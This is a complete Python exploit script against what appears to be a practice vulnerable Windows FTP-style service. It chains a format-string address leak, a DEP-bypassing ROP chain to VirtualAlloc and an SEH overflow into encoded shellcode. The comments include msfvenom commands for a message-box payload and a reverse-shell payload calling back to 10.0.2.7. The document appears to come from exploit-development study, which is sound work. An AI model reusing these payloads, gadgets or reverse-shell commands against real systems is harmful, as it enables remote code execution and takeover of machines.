#!/usr/bin/python
import socket
import struct

HOST = b"127.0.0.1"
PORT = 2121
OFFSET = 1032 


badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

pattern = (
    b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"
)

def leak_address(s: socket.socket):
    print("[*] Leaking base address of binary")
    payload = b"LST |%p|%p|%p|%p|"
    s.sendall(payload)
    data = s.recv(2048)
    if (b"ERROR: Can not open Path" in data):
        base_address = data.split(b"|")[2]
        base_address = int(base_address.decode(), 16) - 0x14120
        print(f"[+] Found base address at {base_address:0x}")
    else:
        print("[-] There was an error getting the base address")
    return base_address


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
base_address = leak_address(sock)
#print(f"{base_address + 0x11396:0x}")

# Start: 3ff60000
# 0:003> ? KERNEL32!GetProcAddress : 1999593040 = 772f5e50

# 0:003> ? kernel32!GetProcAddress - kernel32!VirtualAlloc
# Evaluate expression: 2816 = 00000b00

# base_address + 0x00090150 = kernel32!GetProcAddress IAT
# FFF6 FEB0
# 0:000> ?kernel32!CreateThread - kernel32!VirtualProtect
# Evaluate expression: 4000 = 00000fa0
# rp-win.exe --file Z:\practice\vulnbins-rainbow2\rainbow2.exe --bad-bytes "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x20\x2f\x5C" --va 0 -r 4 > C:\Temp\rainbow2.txt --unique


# premium gadgets
# 0x16238: mov eax, ecx ; ret ; (81 found)
# 0x3ac3e: mov eax, edx ; ret ; (3 found)
# 0x33152: mov edi, edx ; ret ; (3 found)

# 0x113a4: xchg eax, ebx ; ret ; (2 found)

# 0x113a8: add eax, edi ; ret ; (1 found)
# 0x35680: add ebx, eax ; retn 0x0000 ; (1 found)

# 0x3711a: pop eax ; ret ; (42 found)
# 0xdc14: pop ebx ; ret ; (79 found)
# 0x102e: pop ecx ; ret ; (243 found)
# 0x1068: pop esi ; ret ; (236 found)
# 0x100f: pop ebp ; ret ; (2052 found)
# 0x636a2: pop edx ; ret ; (10 found)

# 0x144d: inc eax ; ret ; (198 found)

# 0x7609f: add eax, 0x04 ; ret ; (1 found)
# 0x353d8: add eax, 0x14 ; ret ; (2 found)
# 0x353e1: add eax, 0x18 ; ret ; (2 found)
# 0x62646: add eax, 0x7F ; ret ; (2 found)
# 0x2bb8e: mov eax,  [eax] ; ret ; (2 found)

# semi-premium
# 0x66ce5: add ebx, eax ; mov eax, ecx ; ret ; (2 found)
# 0x665d7: mov ebx, [edx] ; inc eax ; pop ebp ; ret ; (2 found)
# 0x1067: pop edi ; pop esi ; ret ; (45 found)
# 0xf05d: mov  [eax], edx ; pop ebp ; ret ; (2 found)
# 0x6bf4: mov  [ecx], edx ; pop ebp ; ret ; (8 found)
# 0x14ac: in eax, 0x5D ; ret ; (561 found)
# 0x683da: push esp ; add  [eax], eax ; pop ecx ; ret ; (1 found)

writeable = base_address + 0xa635a
ropchain = [
    # get copy of esp into ecx
    base_address + 0x3711a,              # 0x3711a: pop eax ; ret ; (42 found)
    writeable,                           # random writable, needed for eax in next gadget
    base_address + 0x683da,              # 0x683da: push esp ; add  [eax], eax ; pop ecx ; ret ; (1 found) 

    # get address of virtualalloc into edx
    # first get kernel32!WriteFile into eax
    # second add -34080 (0xffff7ae0) to that address to get VirtualAlloc
    base_address + 0x3711a,              # 0x3711a: pop eax ; ret ; (10 found)
    base_address + 0x9015C,              # address of kernel32!WriteFile IAT
    base_address + 0x2bb8e,              # 0x2bb8e: mov eax, dword ptr [eax]; ret;
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx; ret;
    base_address + 0x3711a,              # 0x3711a: pop eax ; ret ; (42 found)
    0xffff7ae0,
    base_address + 0x35680,              # 0x35680: add ebx, eax ; retn 0x0000 ; (1 found)
    
    # skeleton is 892 (0x37c) bytes away from ecx
    # copy ecx into eax and increase until we reach the goal
    base_address + 0x16238,              # 0x16238: mov eax, ecx ; ret ; (81 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x62646,              # 0x62646: add eax, 0x7F ; ret ; (2 found)
    base_address + 0x7609f,              # 0x7609f: add eax, 0x04 ; ret ; (1 found)
    base_address + 0x774c6,              # 0x774c6: dec eax ; ret ; (1 found)

    # replace skeleton value of VirtualAlloc address with real value
    base_address + 0x7e78b,              # 0x7e78b: mov dword ptr [eax], ebx; pop edi; pop esi; pop ebx; pop ebp; ret;
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,

    # save a copy of the pointer to our skeleton in edx for later use
    base_address + 0x3039f,              # 0x3039f: mov edx, eax; mov eax, esi; pop esi; ret;
    0x41414141,
    base_address + 0x3ac3e,              # 0x3ac3e: mov eax, edx ; ret ; (3 found)

    # get address of our shellcode and replace return address
    base_address + 0x353e1,              # 0x353e1: add eax, 0x18 ; ret ; (2 found)
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx ; ret ; (2 found)
    base_address + 0x3ac3e,              # 0x3ac3e: mov eax, edx ; ret ; (3 found)
    base_address + 0x7609f,              # 0x7609f: add eax, 0x04 ; ret ; (1 found)
    base_address + 0x7e78b,              # 0x7e78b: mov dword ptr [eax], ebx; pop edi; pop esi; pop ebx; pop ebp; ret;
    0x41414141,
    0x41414141,
    0xffffffff,                          # ebx
    0x41414141,

    # replace dummy shellcode address
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx ; ret ; (2 found)
    base_address + 0x3ac3e,              # 0x3ac3e: mov eax, edx; ret;
    base_address + 0x353e1,              # 0x353e1: add eax, 0x18 ; ret ; (2 found)
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx ; ret ; (2 found)
    base_address + 0x7609f,              # 0x7609f: add eax, 0x04 ; ret ; (1 found)
    base_address + 0x7e78b,              # 0x7e78b: mov dword ptr [eax], ebx; pop edi; pop esi; pop ebx; pop ebp; ret;
    0x41414141,
    0x41414141,
    0xffffffff,                          # ebx
    0x41414141,
    
    # dwSize, 0x01
    base_address + 0x301e9,              # 0x301e9: inc ebx; ret;
    base_address + 0x301e9,              # 0x301e9: inc ebx; ret;
    base_address + 0x7609f,              # 0x7609f: add eax, 0x04 ; ret ; (1 found)
    base_address + 0x7e78b,              # 0x7e78b: mov dword ptr [eax], ebx; pop edi; pop esi; pop ebx; pop ebp; ret;
    0x41414141,
    0x41414141,
    0x36a04fcd,                          # ebx, 0x1000 - 0xc95fc033 = 0x36a04fcd
    0x41414141,

    # flAllocationType 0x1000
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx; ret;
    base_address + 0x7bda0,              # 0x7bda0: add eax, 0xc95fc033; ret;
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx; ret;
    base_address + 0x7609f,              # 0x7609f: add eax, 0x04 ; ret ; (1 found)
    base_address + 0x7e78b,              # 0x7e78b: mov dword ptr [eax], ebx; pop edi; pop esi; pop ebx; pop ebp; ret;
    0x41414141,
    0x41414141,
    0xffffffc1,                          # ebx, 0x40 - 0x7f = 0xffffffc1
    0x41414141,

    # flProtect 0x40
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx; ret;
    base_address + 0x62646,              # 0x62646: add eax, 0x7f; ret;
    base_address + 0x113a4,              # 0x113a4: xchg eax, ebx; ret;
    base_address + 0x7609f,              # 0x7609f: add eax, 0x04 ; ret ; (1 found)
    base_address + 0x7e78b,              # 0x7e78b: mov dword ptr [eax], ebx; pop edi; pop esi; pop ebx; pop ebp; ret;
    0x41414141,
    0x41414141,
    0x41414141,                          # ebx
    0x41414141,

    # now jump to VirtualAlloc
    base_address + 0x3ac3e,              # 0x3ac3e: mov eax, edx ; ret ; (3 found)
    base_address + 0x8afcd,              # 8afcd: mov ecx, eax; mov eax, esi; pop esi; ret 0x10;
    0x41414141,
    base_address + 0x8b299,              # 8b299: mov esp, ecx; ret;
]

payload = b""
payload += struct.pack("<L", base_address + 0x1010) * 34 # add rop nops before ropchain
for r in ropchain:
    payload += struct.pack("<L", r)

print(f"[*] Size of ropchain: {len(payload)}")

skeleton = b""
skeleton += struct.pack("<L", 0x45454545) # dummy VirtualAlloc Address
skeleton += struct.pack("<L", 0x46464646) # Shellcode Return Address
skeleton += struct.pack("<L", 0x47474747) # dummy Shellcode Address
skeleton += struct.pack("<L", 0x48484848) # dummy dwSize 
skeleton += struct.pack("<L", 0x49494949) # dummy flAllocationType 
skeleton += struct.pack("<L", 0x51515151) # dummy flProtect

# msfvenom -a x86 --platform windows -p windows/messagebox -b "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x20\x2F\x5C" TEXT=pwned TITLE=pwned EXITFUNC=thread -f python -v shellcode
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x20\x2F\x5C" LHOST=10.0.2.7 LPORT=4242 -f python -v shellcode
shellcode =  b""
shellcode += b"\x90" * 48
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xbd\xa7\xb5\x99\x83\xee\xfc"
shellcode += b"\xe2\xf4\x41\x4f\x37\x99\xbd\xa7\xd5\x10\x58"
shellcode += b"\x96\x75\xfd\x36\xf7\x85\x12\xef\xab\x3e\xcb"
shellcode += b"\xa9\x2c\xc7\xb1\xb2\x10\xff\xbf\x8c\x58\x19"
shellcode += b"\xa5\xdc\xdb\xb7\xb5\x9d\x66\x7a\x94\xbc\x60"
shellcode += b"\x57\x6b\xef\xf0\x3e\xcb\xad\x2c\xff\xa5\x36"
shellcode += b"\xeb\xa4\xe1\x5e\xef\xb4\x48\xec\x2c\xec\xb9"
shellcode += b"\xbc\x74\x3e\xd0\xa5\x44\x8f\xd0\x36\x93\x3e"
shellcode += b"\x98\x6b\x96\x4a\x35\x7c\x68\xb8\x98\x7a\x9f"
shellcode += b"\x55\xec\x4b\xa4\xc8\x61\x86\xda\x91\xec\x59"
shellcode += b"\xff\x3e\xc1\x99\xa6\x66\xff\x36\xab\xfe\x12"
shellcode += b"\xe5\xbb\xb4\x4a\x36\xa3\x3e\x98\x6d\x2e\xf1"
shellcode += b"\xbd\x99\xfc\xee\xf8\xe4\xfd\xe4\x66\x5d\xf8"
shellcode += b"\xea\xc3\x36\xb5\x5e\x14\xe0\xcf\x86\xab\xbd"
shellcode += b"\xa7\xdd\xee\xce\x95\xea\xcd\xd5\xeb\xc2\xbf"
shellcode += b"\xba\x58\x60\x21\x2d\xa6\xb5\x99\x94\x63\xe1"
shellcode += b"\xc9\xd5\x8e\x35\xf2\xbd\x58\x60\xc9\xed\xf7"
shellcode += b"\xe5\xd9\xed\xe7\xe5\xf1\x57\xa8\x6a\x79\x42"
shellcode += b"\x72\x22\xf3\xb8\xcf\xbf\x99\xbf\xa0\xdd\x9b"
shellcode += b"\xbd\xb7\x27\x10\x5b\xcd\xa5\xcf\xea\xcf\x2c"
shellcode += b"\x3c\xc9\xc6\x4a\x4c\x38\x67\xc1\x95\x42\xe9"
shellcode += b"\xbd\xec\x51\xcf\x45\x2c\x1f\xf1\x4a\x4c\xd5"
shellcode += b"\xc4\xd8\xfd\xbd\x2e\x56\xce\xea\xf0\x84\x6f"
shellcode += b"\xd7\xb5\xec\xcf\x5f\x5a\xd3\x5e\xf9\x83\x89"
shellcode += b"\x98\xbc\x2a\xf1\xbd\xad\x61\xb5\xdd\xe9\xf7"
shellcode += b"\xe3\xcf\xeb\xe1\xe3\xd7\xeb\xf1\xe6\xcf\xd5"
shellcode += b"\xde\x79\xa6\x3b\x58\x60\x10\x5d\xe9\xe3\xdf"
shellcode += b"\x42\x97\xdd\x91\x3a\xba\xd5\x66\x68\x1c\x45"
shellcode += b"\x2c\x1f\xf1\xdd\x3f\x28\x1a\x28\x66\x68\x9b"
shellcode += b"\xb3\xe5\xb7\x27\x4e\x79\xc8\xa2\x0e\xde\xae"
shellcode += b"\xd5\xda\xf3\xbd\xf4\x4a\x4c"

badchars = (b'\x00',b'\x01',b'\x02',b'\x03',b'\x04',b'\x05',b'\x06',b'\x07',b'\x08',b'\x09',b'\x0a',b'\x0b',b'\x0c',b'\x0d',b'\x20',b'\x2f',b'\x5C')
check = payload + skeleton + shellcode
for c in badchars:
    if (c in check):
        print(b"[-] Bad char found: " + c.hex().encode())

#print("[*] Press button to send overflow")
#temp = input()


print("[*] Triggering buffer overflow")
buf  = b""
buf += b"LST "
buf += payload
buf += b"B" * (OFFSET - len(payload))
buf += b"C" * 4 # nseh
buf += struct.pack("<L", base_address + 0x1139d)         # 0x1139d: add esp, 0x00000D60 ; ret ;
buf += skeleton
buf += shellcode
buf += b"D" * (4000-len(buf))

sock.sendall(buf)
data = sock.recv(2048)


sock.close()